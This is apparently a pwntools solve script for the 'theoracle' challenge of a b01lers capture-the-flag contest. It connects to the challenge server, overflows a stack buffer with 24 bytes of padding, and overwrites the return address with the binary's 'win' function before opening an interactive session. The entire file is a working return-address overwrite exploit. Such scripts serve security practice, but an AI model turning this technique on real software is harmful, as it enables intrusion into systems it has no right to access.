#!/usr/bin/env python3

from pwn import *

exe = ELF("./theoracle-ef25f23d8a2218004732f71bfbfa1267")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()

    r = remote("chal.ctf.b01lers.com", 1015)
    
    r.recvline()
    r.sendline(b"M"*(16+8) + p64(exe.sym['win']))
    
    r.interactive()


if __name__ == "__main__":
    main()
